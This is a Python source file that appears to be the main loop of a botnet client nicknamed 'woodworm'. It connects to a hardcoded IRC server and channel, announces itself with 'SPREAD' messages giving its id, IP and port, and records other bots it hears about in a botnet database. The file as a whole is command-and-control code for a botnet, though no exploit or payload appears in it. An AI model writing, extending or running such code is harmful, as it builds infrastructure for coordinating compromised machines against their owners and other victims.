import asyncio
from time import sleep
from irc import irc_service
from log import logger
from context import context
from botnet import botnet_database
import socket

syslog = logger.Logger()
myContext = None
botnetDB = botnet_database.BotnetDatabase()

ircNick = "woodworm"

async def irc_onConnected(*args, **kwargs):
    irc_connection = args[0]
    await irc_connection.join_channel()

async def irc_onBroadcastRequested(*args, **kwargs):
    irc_connection = args[0]
    await irc_connection.send_message(f"SPREAD id:{myContext.get_id()} ip:{myContext.get_ip()} port:{myContext.get_port()}")

async def irc_onSpreadDetected(*args, **kwargs):
    irc_connection = args[0]
    id = kwargs.get('id')
    ip = kwargs.get('ip')
    port = kwargs.get('port')
    nick = kwargs.get('ircNick')
    syslog.log(f"SPREAD DETECTED: id:{id} ip:{ip} port:{port}, nick:{nick}", level=logger.LogLevel.DEBUG)

    if botnetDB.is_bot_present(id) == False:
        botnetDB.add_bot(context.Context(ip, port, nick))
        syslog.log(f"Bot added to DB: id: {id} ip: {ip} port: {port}, nick: {nick}", level=logger.LogLevel.INFO)


async def another_loop():
    while True:
        await asyncio.sleep(1)
        syslog.log("I'm still alive!", level=logger.LogLevel.DEBUG) 

async def main():
    irc_connection = irc_service.IRCConnection('slaugh.pl', 'slaugh.pl', 2000, ircNick, '#vorest')
    irc_connection.onConnected.subscribe(irc_onConnected)
    irc_connection.onBroadcastRequested.subscribe(irc_onBroadcastRequested)
    irc_connection.onSpreadDetected.subscribe(irc_onSpreadDetected)

    await irc_connection.connect()
    await irc_connection.register_user()
    
    async with asyncio.TaskGroup() as tg:
        tg.create_task(irc_connection.listen())
        tg.create_task(another_loop())
        
if __name__ == "__main__":
    my_ip = socket.gethostbyname(socket.gethostname())
    myContext = context.Context(my_ip, 3000, ircNick)
    myContext.set_connected(True)
    asyncio.run(main())
